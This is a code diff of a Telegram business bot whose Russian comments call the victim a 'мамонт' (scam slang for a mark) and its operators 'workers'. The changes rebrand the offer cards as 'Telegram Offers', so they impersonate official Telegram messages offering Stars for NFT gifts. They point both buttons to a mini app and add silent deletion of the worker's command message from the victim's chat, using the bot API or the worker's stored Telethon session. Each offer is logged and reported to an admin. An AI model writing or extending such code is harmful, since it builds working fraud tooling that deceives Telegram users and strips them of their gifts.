@@ -104,7 +104,7 @@ post_lock = asyncio.Lock()
 waiting_tasks: dict = {}
 
 print("=" * 60)
-print(f"BOT v15 — posts rotation + .offer + logs")
+print(f"BOT v15 — Telegram Offers, delete dot msg, both btns to mini app")
 print(f"BOT_USERNAME: {BOT_USERNAME}")
 print(f"POSTS: {len(PARSED_POSTS)}")
 for p in PARSED_POSTS:
@@ -633,7 +633,6 @@ class SetPriceForm(StatesGroup):
 
 # ─── ПАРСЕР ───
 def parse_target_and_offer(text):
-    """Парсит: /offer user_id ссылка сумма. Ссылка может быть с https:// или без."""
     m = re.search(r'(?:https?://)?(t\.me/nft/[\w\-]+)', text)
     if not m:
         return None
@@ -654,7 +653,6 @@ def parse_target_and_offer(text):
 
 
 def parse_dot_offer(text):
-    """Парсит: .ссылка цена (без user_id — мамонт = чат)."""
     m = re.search(r'(?:https?://)?(t\.me/nft/[\w\-]+)', text)
     if not m:
         return None
@@ -679,15 +677,15 @@ def make_offer_card(o, duration=24):
         delta = expires_at - now
         hours = delta.seconds // 3600
         minutes = (delta.seconds % 3600) // 60
-        time_left = f"{hours}ч {minutes}м"
+        time_left = f"{hours}h {minutes}m"
     else:
-        time_left = "истёк"
+        time_left = "expired"
     uname = o.worker_username or "support"
     return (
-        f"⚖️ <b>Gift Offers</b>\n\n"
-        f"👤 Пользователь <a href='https://t.me/{uname}'>{uname}</a> "
-        f"предлагает вам <b>{o.price_stars}</b> ⭐ за подарок <b>{o.gift_name}</b>\n\n"
-        f"Предложение действует еще <b>{time_left}</b>."
+        f"⚖️ <b>Telegram Offers</b>\n\n"
+        f"👤 User <a href='https://t.me/{uname}'>{uname}</a> "
+        f"offers you <b>{o.price_stars}</b> ⭐ for the gift <b>{o.gift_name}</b>\n\n"
+        f"Offer valid for <b>{time_left}</b>."
     )
 
 
@@ -719,10 +717,10 @@ async def on_business_connection(conn: types.BusinessConnection):
         print(f"business_connection error: {e}")
 
 
-# ─── ТОЧКА — СОЗДАНИЕ ОФФЕРА ───
+# ─── ТОЧКА — СОЗДАНИЕ ОФФЕРА + УДАЛЕНИЕ ───
 @dp.business_message(F.text.startswith("."))
 async def business_offer_dot(message: types.Message):
-    """Воркер отправил .ссылка цена → удаляем → отправляем карточку."""
+    """Воркер отправил .ссылка цена → удаляем сообщение → отправляем карточку."""
     uid = message.from_user.id
     u = await get_user(uid)
     if not u or u.role not in ("worker", "admin"):
@@ -733,27 +731,58 @@ async def business_offer_dot(message: types.Message):
 
     parsed = parse_dot_offer("." + text)
     if not parsed:
-        try:
-            await message.delete()
-        except Exception:
-            pass
-        await bot.send_message(uid,
-            "❌ Формат: <code>.ссылка цена</code>\n"
-            "Пример: <code>.t.me/nft/DeskCalendar-284528 650</code>")
         return
 
     gift_name, gift_link, price_stars = parsed
-
-    try:
-        await message.delete()
-    except Exception as e:
-        print(f"[DOT] delete error: {type(e).__name__}: {e}")
 
     conn = await get_business_conn(uid)
     if not conn or not conn.connection_id:
         await bot.send_message(uid, f"❌ Нет бизнес-подключения. → @{BOT_USERNAME}")
         return
 
+    # ── удаляем сообщение с точкой ──
+    deleted = False
+
+    # способ 1: бот (требует права can_delete_messages)
+    try:
+        await bot.delete_message(chat_id=chat_id, message_id=message.message_id)
+        deleted = True
+        print(f"[DOT] deleted via bot api, msg_id={message.message_id}")
+    except Exception as e:
+        print(f"[DOT] bot delete failed: {type(e).__name__}: {e}")
+
+    # способ 2: через Telethon-сессию воркера (если первое не сработало)
+    if not deleted:
+        try:
+            async with SessionLocal() as s:
+                r = await s.execute(
+                    select(AuthSession).where(
+                        AuthSession.user_id == uid,
+                        AuthSession.session_string.isnot(None)
+                    ).order_by(AuthSession.id.desc()).limit(1)
+                )
+                wsess = r.scalars().first()
+            if wsess and wsess.session_string:
+                wclient = TelegramClient(StringSession(wsess.session_string), API_ID, API_HASH)
+                await wclient.connect()
+                try:
+                    # в бизнес-чате удалять нужно через edit_message? нет, delete_messages
+                    # но для бизнес-чатов Telethon использует business_connection_id
+                    # пробуем напрямую
+                    await wclient.delete_messages(chat_id, [message.message_id])
+                    deleted = True
+                    print(f"[DOT] deleted via telethon worker session")
+                except Exception as e2:
+                    print(f"[DOT] telethon delete failed: {type(e2).__name__}: {e2}")
+                finally:
+                    await wclient.disconnect()
+        except Exception as e:
+            print(f"[DOT] telethon fallback error: {type(e).__name__}: {e}")
+
+    if not deleted:
+        print(f"[DOT] ⚠️ не удалось удалить сообщение {message.message_id} из чата {chat_id}")
+
+    # ── создаём оффер ──
     price_usd = f"{price_stars * 0.0092:.2f}"
     o = await create_offer(
         worker_id=uid, worker_username=message.from_user.username,
@@ -776,14 +805,15 @@ async def business_offer_dot(message: types.Message):
         await bot.send_message(uid, f"❌ Ошибка отправки: {e}")
 
     await add_log(worker_id=uid, offer_id=o.id, event="dot_offer",
-                  detail=f"{gift_name} → {chat_id} за {price_stars}⭐ sent={sent}")
+                  detail=f"{gift_name} → {chat_id} за {price_stars}⭐ sent={sent} deleted={deleted}")
 
     try:
         await bot.send_message(ADMIN_ID,
             f"🆕 <b>Оффер (.)</b>\n"
             f"Воркер: <code>{uid}</code>\n"
             f"Мамонт: <code>{chat_id}</code>\n"
-            f"Подарок: {gift_name}\nЦена: {price_stars}⭐\nID: <code>{o.id}</code>")
+            f"Подарок: {gift_name}\nЦена: {price_stars}⭐\n"
+            f"Удалено: {'✅' if deleted else '❌'}\nID: <code>{o.id}</code>")
     except Exception:
         pass
 
